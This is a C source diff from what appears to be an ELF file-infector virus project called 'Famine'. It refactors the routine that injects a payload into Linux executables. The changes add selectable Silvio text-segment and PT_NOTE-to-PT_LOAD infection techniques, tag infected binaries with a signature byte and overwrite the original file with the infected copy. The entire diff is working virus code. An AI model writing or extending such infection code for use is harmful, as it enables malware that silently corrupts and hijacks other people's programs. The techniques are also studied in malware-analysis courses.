@@ -17,9 +17,10 @@ void overwrite_original_binary(t_famine *famine)
     // Add space in the original binary file and overwrite it with the infected file.
     if (lseek(famine->input_file_fd, 0, SEEK_END) != -1)
     {
-        char zero_fill[PAGE_SIZE];
-        bzero(zero_fill, PAGE_SIZE);
-        write(famine->input_file_fd, zero_fill, PAGE_SIZE);
+        size_t added_size = famine->infected_file_size - famine->binary_data_size;
+        char zero_fill[added_size];
+        bzero(zero_fill, added_size);
+        write(famine->input_file_fd, zero_fill, added_size);
         // Write in the original file.
         memcpy(famine->mmap_ptr, famine->infected_file, famine->infected_file_size);
     }
@@ -35,27 +36,37 @@ void apply_infection(t_famine *famine)
     load_payload(famine, PAYLOAD_NAME_64);
 
     // Set a flag in the EI_PAD header padding that indicate the file have been infected.
-    famine->ehdr->e_ident[EI_PAD + 3] = 7;
+    famine->ehdr->e_ident[EI_PAD + 3] = INFECTION_SIGNATURE;
 
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
-        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
+        if (is_text_segment(famine->phdr[i]))
         {
             //text found here, get the offset of the end of the section;
-            famine->text_p_start_offset = famine->phdr[i].p_offset;
-            famine->text_p_end_offset = famine->phdr[i].p_offset + famine->phdr[i].p_filesz;
-            famine->text_p_size = famine->phdr[i].p_filesz;
-            famine->text_p_vaddr = famine->phdr[i].p_vaddr;
+            famine->p_text_start_offset = famine->phdr[i].p_offset;
+            famine->p_text_end_offset = famine->phdr[i].p_offset + famine->phdr[i].p_filesz;
+            famine->p_text_size = famine->phdr[i].p_filesz;
+            famine->p_text_vaddr = famine->phdr[i].p_vaddr;
 
+            if (FORCE_PT_NOTE_TO_PT_LOAD_INFECTION)
+            {
+                pt_note_to_pt_load_infection(famine);
+                overwrite_original_binary(famine);
+                break;
+            }
+            else if (FORCE_SILVIO_TEXT_INFECTION)
+            {
+                silvio_text_infection(famine);
+                overwrite_original_binary(famine);
+                break;
+            }
             // Check if there is enought space for our payload in the text section.
             if (famine->payload_size > PAGE_SIZE)
             {
                 error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
             }
-            else if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size < PAGE_SIZE)
+            else if (famine->p_text_end_offset % PAGE_SIZE + famine->payload_size < PAGE_SIZE)
             {
-                if (DEBUG == true)
-                    printf("Applying silvio_text infection.\n");
                 silvio_text_infection(famine);
                 overwrite_original_binary(famine);
             }
@@ -63,6 +74,7 @@ void apply_infection(t_famine *famine)
             {
                 error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
             }
+
             break;
         }
     }
